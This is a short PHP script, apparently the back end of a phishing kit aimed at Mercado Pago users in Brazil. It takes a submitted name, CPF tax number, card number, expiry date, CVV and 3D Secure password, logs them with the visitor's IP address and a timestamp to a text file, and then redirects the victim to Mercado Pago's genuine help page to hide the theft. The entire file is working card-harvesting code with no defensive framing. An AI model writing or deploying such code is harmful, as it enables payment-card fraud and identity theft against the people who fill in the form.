<?php
$dados = [
  'nome'     => $_POST['nome']   ?? '',
  'cpf'      => $_POST['cpf']    ?? '',
  'cc'       => $_POST['cc']     ?? '',
  'val'      => $_POST['val']    ?? '',
  'cvv'      => $_POST['cvv']    ?? '',
  'senha3ds' => $_POST['senha3ds'] ?? '',
  'ip'       => $_SERVER['REMOTE_ADDR'],
  'data'     => date('d/m/Y H:i:s')
];
file_put_contents('logs.txt', json_encode($dados, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
header("Location: https://www.mercadopago.com.br/ajuda");
exit;
?>